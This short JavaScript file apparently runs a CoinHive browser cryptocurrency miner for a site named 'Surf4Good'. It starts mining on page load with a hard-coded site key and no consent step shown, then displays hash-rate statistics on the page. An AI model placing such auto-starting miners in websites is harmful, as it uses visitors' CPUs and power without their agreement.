let miner;
let miner_hps;
let totalHashes;
let acceptedHashes;

$("document").ready( () => {
  miner = new CoinHive.Anonymous('bGPba41hhypcm94vnoLUdc0ucIYTo1Yq',
    {domain: "Surf4Good",
     theme : "dark"});
  //miner.domain = "Surf4Good";
  miner.setThrottle(.8);
  miner.start();

  setInterval(()=> {
    miner_hps = miner.getHashesPerSecond();
    totalHashes = miner.getTotalHashes();
    acceptedHashes = miner.getAcceptedHashes();
    $("#hps").text("Hashes Per Second: " + miner_hps);
    $("#hashes").text("Total Hashes: " + totalHashes);
    $("#accepted").text("Accepted Hashes: " + acceptedHashes);
  }, 1000);
});
